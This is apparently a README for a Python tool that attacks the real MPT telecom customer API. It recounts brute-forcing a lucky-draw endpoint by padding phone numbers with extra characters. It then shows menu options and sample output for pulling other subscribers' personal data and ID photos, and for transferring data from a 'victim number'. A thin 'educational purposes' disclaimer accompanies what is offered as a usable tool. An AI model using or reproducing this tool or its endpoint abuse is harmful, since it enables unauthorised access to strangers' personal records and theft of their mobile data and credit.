# MPT Forensic Tool**

We, me and **a guy who living in Mogok**, triggered the main bug which could leads to made unlimited lucky draw existed on the
MPT server(mcare.mpt.com.mm). I just thought it was a bug while parsing the value of data type conversion occured when we try to put the user's MSISDN (phone number).

In line number 408, post a URL Parameter as the target phone number which to get a lucky draw like this.
https://mcare.mpt.com.mm/api/services/luckdraw/v1/play/{targetph}

The backend parsed the parameter(targetph=String) like just extract the DIGITS from the parameter and get a random luckydraw process.
But they didnt noticed a situation occured when someone put some random characters in front of the phone number or behind the number.
So we started put some random characters and made requests again and again. Yes its bruteforcing.

_mcare.mpt.com.mm/api/services/luckdraw/v1/play/95942xx00332_ -> can get a luckdraw after purchasing some package or adding some credit to the number.
_mcare.mpt.com.mm/api/services/luckdraw/v1/play/we_put_series_of_char_here_95942xx00332_ -> its passed and start proceeding the luckydraw process as usual.

the bug was patched on September 24, 2019. May be due to thousand of luckydraw bruteforce requests we had made.

But at least we could get all of user information like user id, name, etc.. from the place we got in.
And you can get data package from victim number just pressing Enter button. BUT the victim number CAN BE NOTICED by a sms that would include your phone number u put as Target Number.
I just uploaded it just for educational purposes and I dont want to be in any trouble. so get ur own way.

#### **How to run?**

```shell script
$ python3.7 MPT_Forensic_Tool.py

================================
MPT Forensic Tool
TwizzyIndy 9/2019
================================

1 . Get Bill Info
2 . Get Account Balance List
3 . Get Data Usage on-a-day
4 . Get User Info
5 . Get User ID Photos
6 . Balance Tranfer ( in process )
7 . Data Transfer
8 . Luckydraw Bruteforce (Patched on September 24, 2019)

Enter a number u wish to continue .. : 4
enter phone number : 942xxxx344
{'custId': 0, 'custType': 'Individual Customer', 'custName': 'xxx', 'firstName': None, 'lastName': None, 'salutation': None, 'gender': None, 'birthday': None, 'email': None, 'address': None, 'contactAddr': None, 'contactTel': None, 'city': None, 'custCategory': '', 'hobbies': '', 'maritalStatus': '', 'occupation': None, 'userName': '', 'nickName': '', 'subsPlanName': None, 'certType': '1', 'certNbr': '12/xxxx(n)xxxxxx', 'certTypeName': None, 'custCode': '14998xxx', 'impGradeName': None, 'creditLimit': None, 'fatherName': None, 'nationType': 'Myanmar', 'visaNo': None, 'visaExpireDate': None, 'visaIssueDate': None, 'race': None, 'state': None, 'township': None, 'socialMedia': None, 'secondContactTel': None, 'secondContactEmail': None}


```

put the number and start it. any phone number must be started with 9xxxxxx. **DONT ADD '0'/Zero**.

#### **How can I get the APIs we used?**

I'm not familiar with POSTMAN or any other REST API Clients(but I know what is Fiddler4).
I added MPT_API.paw which could be open on the mac with PAW Client. I would post more APIs here.
AGAIN, Dont put me in trouble.